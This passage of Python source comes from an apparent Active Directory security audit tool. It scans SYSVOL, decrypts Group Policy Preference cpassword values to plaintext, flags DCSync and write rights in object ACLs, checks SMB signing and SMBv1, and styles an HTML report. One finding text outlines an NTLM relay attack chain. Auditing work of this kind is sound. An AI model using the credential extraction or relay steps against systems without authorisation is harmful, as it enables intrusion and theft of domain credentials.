        try:
            entries = self.smb.listPath("SYSVOL", base_path + "*")
        except Exception as e:
            print(f"[!] Cannot list SYSVOL Policies: {e}")
            return
        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            if not name.startswith("{"):
                continue
            gpo_guid = name
            gpo_name = self._gpo_display_name(gpo_guid)
            gpo_path = base_path + gpo_guid + "\\"
            self._scan_gpo(gpo_guid, gpo_name, gpo_path)

    def _gpo_display_name(self, guid: str) -> str:
        for gpo in self.data.gpos:
            dn_attr = gpo.get("dn", "")
            if guid.upper() in dn_attr.upper():
                return get_str(gpo["attrs"], "displayName") or guid
        return guid

    def _scan_gpo(self, guid: str, display_name: str, base_path: str):
        subdirs = ["Machine\\", "User\\",
                   "Machine\\Preferences\\", "User\\Preferences\\",
                   "Machine\\Preferences\\Groups\\",
                   "User\\Preferences\\Groups\\",
                   "Machine\\Preferences\\Services\\",
                   "User\\Preferences\\Services\\",
                   "Machine\\Preferences\\ScheduledTasks\\",
                   "User\\Preferences\\ScheduledTasks\\",
                   "Machine\\Preferences\\DataSources\\",
                   "User\\Preferences\\DataSources\\",
                   "Machine\\Preferences\\Printers\\",
                   "User\\Preferences\\Printers\\",
                   "Machine\\Preferences\\Drives\\",
                   "User\\Preferences\\Drives\\",
                   "Machine\\Microsoft\\Windows NT\\SecEdit\\",
                   "Machine\\Registry.pol",
                   "User\\Registry.pol",
                   ]
        # Scan Registry.pol files
        for subpath in ["Machine\\Registry.pol", "User\\Registry.pol"]:
            full = base_path + subpath
            raw = self._read_file(full)
            if raw:
                self._parse_registry_pol(guid, display_name, full, raw)

        # Scan GptTmpl.inf
        inf_path = base_path + "Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf"
        raw = self._read_file(inf_path)
        if raw:
            self._parse_gpttmpl(guid, display_name, raw)

        # Scan GPP preference XML files
        for scope in ("Machine", "User"):
            for fname in self._GPP_FILES:
                subcat = fname.replace(".xml", "")
                full = base_path + f"{scope}\\Preferences\\{subcat}\\{fname}"
                raw = self._read_file(full)
                if raw:
                    self._parse_gpp_xml(guid, display_name, full, raw)

    def _read_file(self, path: str) -> Optional[bytes]:
        buf = io.BytesIO()
        try:
            self.smb.getFile("SYSVOL", path, buf.write)
            return buf.getvalue()
        except Exception:
            return None

    def _parse_registry_pol(self, guid: str, name: str, path: str, raw: bytes):
        entries = parse_registry_pol(raw)
        for key, valname, regtype, rawdata in entries:
            self.data.sysvol_data["registry_pol"].append({
                "gpo_guid":    guid,
                "gpo_name":    name,
                "path":        path,
                "key":         key,
                "name":        valname,
                "regtype":     regtype,
                "raw":         rawdata,
            })

    def _parse_gpttmpl(self, guid: str, name: str, raw: bytes):
        try:
            text = raw.decode("utf-16-le", errors="replace")
        except Exception:
            try:
                text = raw.decode("utf-8", errors="replace")
            except Exception:
                return
        section = ""
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith(";"):
                continue
            if line.startswith("[") and line.endswith("]"):
                section = line[1:-1].strip()
                continue
            if "=" in line:
                k, _, v = line.partition("=")
                self.data.sysvol_data["inf_settings"].append({
                    "gpo_guid": guid,
                    "gpo_name": name,
                    "section":  section,
                    "key":      k.strip(),
                    "value":    v.strip(),
                })

    def _parse_gpp_xml(self, guid: str, name: str, path: str, raw: bytes):
        try:
            text = raw.decode("utf-16-le", errors="replace")
        except Exception:
            try:
                text = raw.decode("utf-8", errors="replace")
            except Exception:
                return
        try:
            root = ET.fromstring(text)
        except ET.ParseError:
            return
        # Walk every element looking for cpassword attributes
        for elem in root.iter():
            cpass = elem.get("cpassword", "")
            if not cpass:
                continue
            username  = (elem.get("userName") or elem.get("runAs") or
                         elem.get("username") or "")
            newname   = elem.get("newName", "")
            plaintext = decrypt_gpp_cpassword(cpass)
            self.data.sysvol_data["gpp_passwords"].append({
                "gpo_guid":  guid,
                "gpo_name":  name,
                "file":      path,
                "element":   elem.tag,
                "username":  username or newname,
                "cpassword": cpass,
                "plaintext": plaintext,
            })


# ─────────────────────────────────────────────────────────────────────────────
# ACL ANALYZER
# ─────────────────────────────────────────────────────────────────────────────

# Dangerous ACE masks
_ACE_WRITE_DAC       = 0x00040000
_ACE_WRITE_OWNER     = 0x00080000
_ACE_GENERIC_ALL     = 0x10000000
_ACE_GENERIC_WRITE   = 0x40000000
_ACE_DS_WRITE_PROP   = 0x00000020
_ACE_DS_CTRL_ACCESS  = 0x00000100
_ACE_DS_WRITE_MEMBER = 0x00000028  # WriteProperty on member attribute

# Well-known broad principal SIDs
_BROAD_SIDS = {
    "S-1-1-0":   "Everyone",
    "S-1-5-11":  "Authenticated Users",
    "S-1-5-7":   "Anonymous Logon",
    "S-1-5-4":   "Interactive",
}

# DCSync extended right GUIDs
_DCSYNC_GUIDS = {
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
}

# Write-member GUID (member attribute objectGuid in schema)
_MEMBER_GUID = "bf9679c0-0de6-11d0-a285-00aa003049e2"


def _guid_from_bytes(b: bytes) -> str:
    """Format a little-endian GUID bytes to string."""
    if len(b) < 16:
        return ""
    p1 = struct.unpack_from("<IHH", b, 0)
    p2 = b[8:10]
    p3 = b[10:16]
    return "{%08x-%04x-%04x-%s-%s}" % (
        p1[0], p1[1], p1[2],
        p2.hex(), p3.hex()
    )


class ACLAnalyzer:
    """Fetches and analyses DACLs on high-value AD objects for dangerous ACEs."""

    def __init__(self, conn: "ADConnection", data: "ADData", args):
        self.conn  = conn
        self.data  = data
        self.args  = args
        # broad SID set, expanded with domain-relative SIDs once we have domain_sid
        self._broad: Dict[str, str] = dict(_BROAD_SIDS)

    def run(self):
        if not HAS_IMPACKET_LDAP:
            print("[!] impacket not available — skipping ACL analysis")
            return
        print("[*] Analysing ACLs on high-value objects...")
        self._build_broad_sids()
        # Domain root object
        self._check_object_acl(
            self.conn.base_dn, "Domain Root",
            check_dcsync=True, check_owner=True)
        # Domain Admins group
        da_dn = self._find_group_dn("Domain Admins")
        if da_dn:
            self._check_object_acl(da_dn, "Domain Admins", check_owner=True)
        # Enterprise Admins group
        ea_dn = self._find_group_dn("Enterprise Admins")
        if ea_dn:
            self._check_object_acl(ea_dn, "Enterprise Admins", check_owner=True)
        # Schema Admins group
        sa_dn = self._find_group_dn("Schema Admins")
        if sa_dn:
            self._check_object_acl(sa_dn, "Schema Admins")
        # AdminSDHolder
        ash_dn = f"CN=AdminSDHolder,CN=System,{self.conn.base_dn}"
        self._check_object_acl(ash_dn, "AdminSDHolder")
        # All GPO objects
        for gpo in self.data.gpos:
            dn = gpo.get("dn", "")
            display = get_str(gpo["attrs"], "displayName") or dn
            if dn:
                self._check_gpo_acl(dn, display)

    def _build_broad_sids(self):
        if self.data.domain_obj:
            raw_sid = self.data.domain_obj.get("attrs", {}).get("objectSid")
            if raw_sid:
                if isinstance(raw_sid, list):
                    raw_sid = raw_sid[0]
                domain_sid = self._raw_sid_to_str(raw_sid)
                if domain_sid:
                    self._broad[f"{domain_sid}-513"] = "Domain Users"
                    self._broad[f"{domain_sid}-515"] = "Domain Computers"
                    self._broad[f"{domain_sid}-516"] = "Domain Controllers"  # not broad, but collect
                    self._broad.pop(f"{domain_sid}-516", None)

    def _raw_sid_to_str(self, raw) -> str:
        if isinstance(raw, (bytes, bytearray)):
            return sid_to_str(raw)
        return str(raw)

    def _find_group_dn(self, sam: str) -> Optional[str]:
        r = self.conn.search_one(
            self.conn.base_dn,
            f"(sAMAccountName={sam})",
            ["distinguishedName"])
        if r:
            return r.get("dn", "")
        return None

    def _fetch_sd(self, dn: str) -> Optional[bytes]:
        if getattr(self.conn, "_impacket", None):
            return self._fetch_sd_impacket(dn)
        try:
            from ldap3.protocol.microsoft import security_descriptor_control as sdc
            sdctrl = sdc(sdflags=0x07)  # Owner+Group+DACL
            self.conn.conn.search(
                dn, "(objectClass=*)", ldap3.BASE,
                attributes=["nTSecurityDescriptor"],
                controls=[sdctrl])
            for entry in self.conn.conn.response:
                if entry.get("type") == "searchResEntry":
                    raw_list = entry.get("raw_attributes", {}).get(
                        "nTSecurityDescriptor", [])
                    if raw_list:
                        return raw_list[0] if isinstance(raw_list, list) else raw_list
        except Exception:
            pass
        return None

    def _fetch_sd_impacket(self, dn: str) -> Optional[bytes]:
        try:
            from impacket.ldap.ldapasn1 import Control, Scope as LDAPScope
            from pyasn1.codec.ber import encoder
            from pyasn1.type import univ
            ctrl = Control()
            ctrl["controlType"] = "1.2.840.113556.1.4.801"
            seq = univ.Sequence()
            seq.setComponentByPosition(0, univ.Integer(0x07))
            ctrl["controlValue"] = encoder.encode(seq)
            results = self.conn._impacket.search(
                searchBase=dn, searchFilter="(objectClass=*)",
                scope=LDAPScope("baseObject"),
                attributes=["nTSecurityDescriptor"],
                searchControls=[ctrl])
            for entry in results:
                for attr in entry["attributes"]:
                    if str(attr["type"]) == "nTSecurityDescriptor" and attr["vals"]:
                        return bytes(attr["vals"][0])
        except Exception:
            pass
        return None

    def _parse_dacl(self, raw_sd: bytes):
        try:
            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd.fromString(raw_sd)
            return sd
        except Exception:
            return None

    def _sid_str(self, ace_sid) -> str:
        try:
            return ace_sid.formatCanonical()
        except Exception:
            try:
                return str(ace_sid)
            except Exception:
                return ""

    def _check_object_acl(self, dn: str, label: str,
                           check_dcsync: bool = False,
                           check_owner: bool = False):
        raw_sd = self._fetch_sd(dn)
        if not raw_sd:
            return
        sd = self._parse_dacl(raw_sd)
        if not sd:
            return

        # Check owner
        if check_owner and sd["OwnerSid"]:
            owner_sid = self._sid_str(sd["OwnerSid"])
            owner_name = self._broad.get(owner_sid)
            if owner_name:
                self.data.acl_findings.append({
                    "type":    "owner",
                    "object":  label,
                    "dn":      dn,
                    "sid":     owner_sid,
                    "sid_name": owner_name,
                    "right":   "OWNER",
                    "detail":  f"{owner_name} owns {label}",
                })

        # Check DACL
        dacl = sd["Dacl"]
        if not dacl:
            return
        for ace in dacl["Data"]:
            try:
                ace_type = ace["TypeName"]
                if "DENIED" in ace_type.upper():
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                sid_str_val = self._sid_str(ace["Ace"]["Sid"])
                principal_name = self._broad.get(sid_str_val)
                if not principal_name:
                    continue  # not a broad principal

                # DCSync rights
                if check_dcsync and "OBJECT" in ace_type.upper():
                    try:
                        obj_type = ace["Ace"].get("ObjectType", b"")
                        if obj_type and len(obj_type) == 16:
                            guid_str = _guid_from_bytes(bytes(obj_type))
                            dcsync_name = _DCSYNC_GUIDS.get(guid_str.strip("{}").lower())
                            if dcsync_name:
                                self.data.acl_findings.append({
                                    "type":      "dcsync",
                                    "object":    label,
                                    "dn":        dn,
                                    "sid":       sid_str_val,
                                    "sid_name":  principal_name,
                                    "right":     dcsync_name,
                                    "detail":    f"{principal_name} has {dcsync_name} on {label}",
                                })
                    except Exception:
                        pass

                # Dangerous masks on the object
                dangerous = _ACE_WRITE_DAC | _ACE_WRITE_OWNER | _ACE_GENERIC_ALL
                if mask & dangerous:
                    bits = []
                    if mask & _ACE_WRITE_DAC:    bits.append("WriteDACL")
                    if mask & _ACE_WRITE_OWNER:  bits.append("WriteOwner")
                    if mask & _ACE_GENERIC_ALL:  bits.append("GenericAll")
                    self.data.acl_findings.append({
                        "type":     "dangerous_acl",
                        "object":   label,
                        "dn":       dn,
                        "sid":      sid_str_val,
                        "sid_name": principal_name,
                        "right":    ",".join(bits),
                        "detail":   f"{principal_name} has {','.join(bits)} on {label}",
                    })

                # WriteProperty (GenericWrite or DS_WRITE_PROP)
                if mask & (_ACE_GENERIC_WRITE | _ACE_DS_WRITE_PROP):
                    self.data.acl_findings.append({
                        "type":     "write_property",
                        "object":   label,
                        "dn":       dn,
                        "sid":      sid_str_val,
                        "sid_name": principal_name,
                        "right":    "WriteProperty",
                        "detail":   f"{principal_name} has WriteProperty on {label}",
                    })
            except Exception:
                continue

    def _check_gpo_acl(self, dn: str, display_name: str):
        raw_sd = self._fetch_sd(dn)
        if not raw_sd:
            return
        sd = self._parse_dacl(raw_sd)
        if not sd:
            return
        dacl = sd["Dacl"]
        if not dacl:
            return
        for ace in dacl["Data"]:
            try:
                ace_type = ace["TypeName"]
                if "DENIED" in ace_type.upper():
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                sid_str_val = self._sid_str(ace["Ace"]["Sid"])
                principal_name = self._broad.get(sid_str_val)
                if not principal_name:
                    continue
                write_bits = _ACE_WRITE_DAC | _ACE_WRITE_OWNER | _ACE_GENERIC_ALL | _ACE_DS_WRITE_PROP | _ACE_GENERIC_WRITE
                if mask & write_bits:
                    self.data.acl_findings.append({
                        "type":     "gpo_write",
                        "object":   display_name,
                        "dn":       dn,
                        "sid":      sid_str_val,
                        "sid_name": principal_name,
                        "right":    "GPO-Write",
                        "detail":   f"{principal_name} can modify GPO '{display_name}'",
                    })
            except Exception:
                continue


# ─────────────────────────────────────────────────────────────────────────────
# SMB CHECKS
# ─────────────────────────────────────────────────────────────────────────────

class SMBChecker:
    def __init__(self, target: str, args, findings: List[Finding]):
        self.target   = target
        self.args     = args
        self.findings = findings

    def _add(self, rule_id: str, details: str = "", affected: List[str] = None):
        t, cat, pts, sev = RULES.get(rule_id,
                           (rule_id, "Anomaly", 5, "MEDIUM"))
        aff = _dedup_keep_order(affected or [])
        self.findings.append(Finding(
            rule_id=rule_id, title=t, category=cat,
            points=scaled_points(rule_id, pts, len(aff)), severity=sev,
            details=details, affected=aff,
            maturity=rule_maturity(rule_id, sev),
            mitre=RULE_MITRE.get(rule_id, [])))

    def run(self):
        if not HAS_IMPACKET_SMB:
            print("[!] impacket not available — skipping SMB checks")
            return
        print("[*] Running SMB checks...")
        self._check_smb_signing()
        self._check_smbv1()

    def _get_smb_conn(self) -> Optional["SMBConnection"]:
        try:
            smb = SMBConnection(self.target, self.target, timeout=10)
            if self.args.kerberos:
                lm = nt = ""
                if self.args.hashes:
                    h = self.args.hashes
                    lm, nt = (h.split(":", 1) if ":" in h else ("", h))
                smb.kerberosLogin(self.args.username or "",
                                  self.args.password or "",
                                  self.args.domain or "", lm, nt,
                                  self.args.aes_key or "",
                                  kdcHost=self.args.dc_ip,
                                  useCache=bool(os.environ.get("KRB5CCNAME")))
            elif self.args.hashes:
                lm = nt = ""
                h = self.args.hashes
                if ":" in h:
                    lm, nt = h.split(":", 1)
                else:
                    nt = h
                smb.login(self.args.username or "",
                          self.args.password or "",
                          self.args.domain or "",
                          lm, nt)
            elif self.args.null_session:
                smb.login("", "", "")
            elif self.args.username and self.args.password:
                smb.login(self.args.username,
                          self.args.password,
                          self.args.domain or "")
            else:
                smb.login("", "", "")
            return smb
        except Exception as e:
            if self.args.verbose:
                print(f"[!] SMB connect failed: {e}")
            return None

    def _check_smb_signing(self):
        # Reuse the authenticated connection (handles password/hash/Kerberos) and
        # ask impacket directly whether the server REQUIRES SMB signing — the
        # security-relevant flag for NTLM relay.
        smb = self._get_smb_conn()
        if smb is None:
            return
        try:
            required = smb.isSigningRequired()
        except Exception as e:
            if self.args.verbose:
                print(f"[!] SMB signing check failed: {e}")
            return
        finally:
            try:
                smb.logoff()
            except Exception:
                pass
        if not required:
            self._add("A-SMB2SignatureNotRequired",
                      f"{self.target}: SMB signing is NOT required by the server. "
                      "Unsigned SMB sessions can be relayed (impacket-ntlmrelayx) — "
                      "coerce DC/host auth (PetitPotam/PrinterBug) and relay to this "
                      "or another host for code execution or ADCS (ESC8).",
                      [self.target])

    def _check_smbv1(self):
        try:
            smb1 = SMBConnection(self.target, self.target, timeout=10,
                                 preferredDialect="NT LM 0.12")
            smb1.login("", "", "")
            dialect = smb1.getDialect()
            smb1.logoff()
            if dialect == "NT LM 0.12":
                self._add("S-SMB-v1",
                          f"{self.target} negotiated SMBv1 (NT LM 0.12). "
                          "SMBv1 should be disabled — EternalBlue (MS17-010) risk.",
                          [self.target])
        except Exception:
            pass  # SMBv1 rejection is expected / desired


# ─────────────────────────────────────────────────────────────────────────────
# RISK SCORER
# ─────────────────────────────────────────────────────────────────────────────

class RiskScorer:
    def __init__(self, findings: List[Finding]):
        self.findings = findings

    def score(self) -> Dict[str, int]:
        # Scoring model: per-category danger score, each capped at 100;
        # the global score is the MAX of the four (worst category wins).
        cats = defaultdict(int)
        for cat in ("Anomaly", "Privileged", "Stale", "Trust"):
            cats[cat] = 0
        for f in self.findings:
            cats[f.category] += f.points
        for k in list(cats.keys()):
            cats[k] = min(cats[k], 100)
        total = max(cats.values()) if cats else 0
        cats["Total"] = total
        cats["Maturity"] = self.maturity()
        return dict(cats)

    def maturity(self) -> int:
        """Achieved CMMI maturity = lowest level still gated by a failing rule
        (5 = perfect; one failing level-1 rule pins the whole domain at 1)."""
        if not self.findings:
            return 5
        return min(f.maturity for f in self.findings)

    @staticmethod
    def risk_label(score: int) -> Tuple[str, str]:
        """(label, colour) — 25/50/75/100 risk bands, field palette."""
        if score >= 75:
            return "CRITICAL RISK", "#b23a2e"
        if score >= 50:
            return "HIGH RISK",     "#c2702a"
        if score >= 25:
            return "MEDIUM RISK",   "#c9a227"
        if score > 0:
            return "LOW RISK",      "#6f8f3f"
        return "MINIMAL RISK",      "#6f8f3f"


# ─────────────────────────────────────────────────────────────────────────────
# HTML REPORT GENERATOR  (operator-focused, single-file deliverable)
# ─────────────────────────────────────────────────────────────────────────────

# technique-id -> ATT&CK tactic (coarse) for the coverage matrix
ATTACK_TACTIC = {
    "T1087":"Discovery", "T1069":"Discovery",
    "T1199":"Initial Access", "T1195":"Initial Access",
    "T1078":"Persistence", "T1098":"Persistence", "T1136":"Persistence",
    "T1556":"Credential Access", "T1003":"Credential Access",
    "T1558":"Credential Access", "T1552":"Credential Access",
    "T1649":"Credential Access", "T1557":"Credential Access", "T1187":"Credential Access",
    "T1134":"Privilege Escalation", "T1484":"Privilege Escalation",
    "T1222":"Defense Evasion", "T1574":"Defense Evasion",
    "T1210":"Lateral Movement", "T1550":"Lateral Movement",
    "T1584":"Resource Development",
}
ATTACK_TACTIC_ORDER = ["Initial Access","Resource Development","Discovery",
                       "Credential Access","Privilege Escalation","Defense Evasion",
                       "Persistence","Lateral Movement"]

# rule_id -> remediation effort tier for the roadmap (default Medium)
RULE_EFFORT = {
    "A-WDigest":"Low","A-LMCompatibilityLevel":"Low","A-LLMNR":"Low","A-NBTNSDisabled":"Low",
    "A-DCLdapSign":"Low","A-SMB2SignatureNotRequired":"Low","A-SMB2SignatureNotEnabled":"Low",
    "A-Guest":"Low","A-MinPwdLen":"Low","A-PwdComplexity":"Low","A-PwdHistory":"Low",
    "A-RestrictRemoteSAM":"Low","A-NTLMAudit":"Low","A-DSRMLogon":"Low","A-HardenedPaths":"Low",
    "A-CredentialGuard":"Low","A-PowerShellLogging":"Low","P-MachineAccountQuota":"Low",
    "A-DnsZoneUpdate1":"Low","P-RecycleBin":"Low","A-WSUS-HTTP":"Low","P-AdminCountOrphan":"Low",
    "A-DCLdapsChannelBinding":"Low","S-SIDHistory":"Low",
    "A-LAPS-Not-Installed":"High","A-LocalAdminPassword":"High","P-UnconstrainedDelegation":"High",
    "S-OS-XP":"High","S-OS-Vista":"High","S-OS-NT":"High","S-SMB-v1":"High","P-AdminNum":"High",
    "P-ProtectedUsers":"High","A-Krbtgt":"High","S-FunctionalLevel1":"High","S-FunctionalLevel3":"High",
    "P-ComputerInPrivGroup":"High","P-ServiceDomainAdmin":"High",
}

# ── Theme — field/army ops console (olive drab + khaki + brass). Dark by
#    default, with a light variant for print; a clean monochrome print sheet. ──
_KC_CSS = r"""
:root{
  --bg:#13150d; --surface:#1b1e12; --surface2:#222616; --surface3:#2a2f1c;
  --border:#343a22; --border2:#454d2e; --track:#2c3119;
  --text:#e8e3d2; --muted:#9aa07f; --faint:#6c7350;
  --accent:#c2a14e;        /* brass / khaki */
  --accent2:#7d8c4e;       /* field radio green */
  --deck:#cdbb8a;          /* painted marking tan */
  --crit:#b23a2e; --high:#c2702a; --med:#c9a227; --low:#6f8f3f; --info:#8a8f78;
  --ok:#7a9a4e; --warn:#c9a227; --bad:#b23a2e;
  --shadow:0 6px 26px rgba(0,0,0,.5);
  --mono:'JetBrains Mono','SFMono-Regular',ui-monospace,Menlo,Consolas,monospace;
  --sans:'Inter','Segoe UI',system-ui,-apple-system,sans-serif;
  --head:'Oswald','Roboto Condensed','Arial Narrow',var(--sans);
  --r:7px; --r-sm:4px;
}
html[data-theme=light]{
  --bg:#dcd8c4; --surface:#ebe7d6; --surface2:#e2ddc8; --surface3:#d6d0b8;
  --border:#bdb491; --border2:#a89f7c; --track:#cfc8ad;
  --text:#23270f; --muted:#5d6244; --faint:#7c8160;
  --accent:#7a5f1e; --accent2:#566b2f; --deck:#5a5230;
  --shadow:0 4px 16px rgba(60,55,30,.18);
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--sans);background:var(--bg);color:var(--text);font-size:14px;
  line-height:1.55;-webkit-font-smoothing:antialiased;
  background-image:radial-gradient(1200px 700px at 85% -8%,rgba(194,161,78,.05),transparent 70%);}
a{color:var(--accent);text-decoration:none}
a:hover{text-decoration:underline}
code{font-family:var(--mono);font-size:.86em;background:var(--surface3);
  padding:1px 6px;border-radius:var(--r-sm);color:var(--deck)}
.kc-mono{font-family:var(--mono);font-size:.88em}
.kc-muted{color:var(--muted)}
h1,h2,h3,h4{font-family:var(--head);font-weight:700;letter-spacing:.04em}

/* ── cover ── */
.kc-cover{background:linear-gradient(160deg,#1c1f12,#10120b 70%);border-bottom:3px solid var(--accent);
  position:relative;overflow:hidden}
html[data-theme=light] .kc-cover{background:linear-gradient(160deg,#cfc8ad,#bdb491 70%)}
.kc-cover-band{font-family:var(--mono);font-size:11px;letter-spacing:.32em;text-transform:uppercase;
  color:#13150d;background:repeating-linear-gradient(135deg,var(--accent) 0 14px,#1b1e12 14px 28px);
  padding:6px 24px;text-align:center;font-weight:700}
.kc-cover-body{max-width:1180px;margin:0 auto;padding:40px 40px 44px;text-align:center;position:relative;z-index:1}
.kc-logo{font-size:54px;line-height:1;color:var(--accent);text-shadow:0 2px 0 rgba(0,0,0,.4)}
.kc-cover h1{font-size:58px;letter-spacing:.22em;margin-top:6px;color:var(--text)}
.kc-cover-sub{font-family:var(--mono);font-size:12px;letter-spacing:.34em;text-transform:uppercase;
  color:var(--muted);margin-top:2px}
.kc-cover-domain{font-family:var(--head);font-size:22px;letter-spacing:.06em;color:var(--deck);margin:18px 0 4px}
.kc-cover-meta{margin:18px auto 0;border-collapse:collapse;font-size:13px;max-width:520px;width:100%}
.kc-cover-meta td{padding:5px 14px;border-bottom:1px dashed var(--border2);text-align:left}
.kc-cover-meta td:first-child{color:var(--muted);text-transform:uppercase;font-size:11px;
  letter-spacing:.08em;font-family:var(--mono);width:46%}
.kc-cover-score{display:inline-block;margin-top:22px;border:2px solid;border-radius:10px;padding:10px 26px;background:rgba(0,0,0,.18)}
.kc-cover-score span{font-family:var(--head);font-size:44px;font-weight:700}
.kc-cover-score small{display:block;font-family:var(--mono);font-size:11px;letter-spacing:.14em;color:var(--muted)}

/* ── sticky nav ── */
.kc-nav{position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:14px;
  background:rgba(19,21,13,.94);backdrop-filter:blur(6px);border-bottom:1px solid var(--border);
  padding:0 20px;height:48px}
html[data-theme=light] .kc-nav{background:rgba(220,216,196,.95)}
.kc-nav::after{content:"";position:absolute;left:0;right:0;bottom:-1px;height:2px;opacity:.5;
  background:repeating-linear-gradient(135deg,var(--accent2) 0 10px,transparent 10px 20px)}
.kc-nav-brand{font-family:var(--head);letter-spacing:.18em;color:var(--accent);font-weight:700;font-size:16px}
.kc-nav-links{display:flex;gap:4px;flex:1;overflow:auto}
.kc-nav-links a{font-family:var(--mono);font-size:11.5px;letter-spacing:.06em;text-transform:uppercase;
  color:var(--muted);padding:6px 10px;border-radius:var(--r-sm);white-space:nowrap}
.kc-nav-links a:hover,.kc-nav-links a.active{color:var(--text);background:var(--surface2);text-decoration:none}
.kc-navb{display:inline-block;margin-left:6px;background:var(--accent);color:#13150d;border-radius:9px;
  font-size:10px;padding:0 6px;font-weight:700}
.kc-nav-tools{display:flex;gap:6px}
.kc-iconbtn{background:var(--surface2);border:1px solid var(--border2);color:var(--text);
  width:30px;height:30px;border-radius:var(--r-sm);cursor:pointer;font-size:15px}
.kc-iconbtn:hover{border-color:var(--accent);color:var(--accent)}

/* ── layout ── */
.kc-container{max-width:1180px;margin:0 auto;padding:26px 24px 60px}
.kc-section{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);
  padding:22px 24px;margin-bottom:22px;box-shadow:var(--shadow)}
.kc-h2{font-size:18px;letter-spacing:.08em;text-transform:uppercase;color:var(--text);
  padding-bottom:10px;margin-bottom:14px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:9px}
.kc-h2 .kc-count{color:var(--muted);font-weight:400;font-size:14px}
.kc-sub{color:var(--muted);font-size:13px;margin-bottom:14px}
.kc-sub-h{font-family:var(--head);font-size:14px;letter-spacing:.06em;text-transform:uppercase;
  color:var(--deck);margin:18px 0 10px}
.kc-critborder{border-left:3px solid var(--crit)}
.kc-critsub{color:var(--crit);font-weight:600}

/* ── narrative ── */
.kc-narrative p{margin-bottom:10px;font-size:14.5px;line-height:1.65}
.kc-keyrisks{margin-top:18px;background:var(--surface2);border:1px solid var(--border);
  border-radius:var(--r);padding:14px 18px}
.kc-keyrisks h3{font-size:13px;letter-spacing:.08em;text-transform:uppercase;color:var(--deck);margin-bottom:8px}
.kc-keyrisks ul{list-style:none}
.kc-keyrisks li{padding:5px 0;display:flex;align-items:baseline;gap:8px}
.kc-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0;display:inline-block;transform:translateY(1px)}
.kc-kr-sub{color:var(--muted);font-size:12.5px}

/* ── scorecard ── */
.kc-scorecard{display:grid;grid-template-columns:auto auto 1fr;gap:16px;margin-top:6px}
@media(max-width:880px){.kc-scorecard{grid-template-columns:1fr}}
.kc-card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r);padding:14px 16px}
.kc-card-h{font-family:var(--mono);font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;
  color:var(--faint);margin-bottom:8px}
.kc-card-gauge,.kc-card-donut{text-align:center}
.kc-legend{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:6px;font-size:11px;color:var(--muted)}
.kc-legend i{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:4px}
.kc-cat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
@media(max-width:880px){.kc-cat-grid{grid-template-columns:repeat(2,1fr)}}
.kc-cat-card{background:var(--surface3);border-top:3px solid;border-radius:var(--r-sm);padding:10px 12px}
.kc-cat-label{font-family:var(--mono);font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
.kc-cat-score{font-family:var(--head);font-size:32px;line-height:1.05}
.kc-cat-count{font-size:11px;color:var(--faint)}
.kc-cat-track{background:var(--track);border-radius:3px;height:6px;margin-top:6px;overflow:hidden}
.kc-cat-bar{height:6px;border-radius:3px}

/* ── maturity ladder ── */
.kc-ladder{display:flex;align-items:center;justify-content:space-between;margin:14px 0 6px;max-width:560px}
.kc-mstep{display:flex;flex-direction:column;align-items:center;gap:4px}
.kc-mlabel{font-family:var(--mono);font-size:9.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted)}
.kc-mconn{flex:1;height:2px;background:var(--border2);margin:0 4px;margin-bottom:18px}
.kc-mbox{background:var(--surface2);border-left:3px solid var(--accent);border-radius:0 var(--r-sm) var(--r-sm) 0;
  padding:10px 14px;margin:10px 0;font-size:13.5px}
.kc-mtag{font-family:var(--mono);font-size:10px;background:var(--surface3);border:1px solid var(--border2);
  color:var(--deck);border-radius:3px;padding:1px 5px}

/* ── ATT&CK ── */
.kc-attack-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}
.kc-tcol{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r);padding:10px}
.kc-tcol-h{font-family:var(--mono);font-size:10px;letter-spacing:.08em;text-transform:uppercase;
  color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:6px;margin-bottom:8px}
.kc-tech{display:flex;align-items:center;gap:6px;padding:5px 6px;border-radius:var(--r-sm);
  background:var(--surface3);margin-bottom:5px;cursor:default}
.kc-tech-id{font-family:var(--mono);font-size:10.5px;color:var(--deck)}
.kc-tech-n{flex:1;font-size:11.5px;color:var(--text)}
.kc-tech-c{font-family:var(--mono);font-size:11px;background:var(--accent);color:#13150d;border-radius:8px;padding:0 6px;font-weight:700}

/* ── tables ── */
.kc-table{width:100%;border-collapse:collapse;border-radius:var(--r-sm);overflow:hidden;font-size:13px}
.kc-table th{background:var(--surface3);color:var(--deck);text-align:left;padding:9px 11px;
  font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;font-weight:600}
.kc-table td{padding:9px 11px;border-bottom:1px solid var(--border);vertical-align:top}
.kc-table tbody tr:last-child td{border-bottom:none}
.kc-table tbody tr:hover td{background:var(--surface2)}
.kc-num{text-align:right;font-variant-numeric:tabular-nums;font-family:var(--mono)}
.kc-detail{color:var(--muted);font-size:12px}
.kc-sid code{font-size:10px;color:var(--faint);background:transparent;padding:0}
.kc-crit-val{background:var(--crit);color:#fff;font-weight:700}
.kc-ok{color:var(--ok);font-weight:600}.kc-bad{color:var(--bad);font-weight:600}.kc-warn{color:var(--warn);font-weight:600}

/* pills / badges */
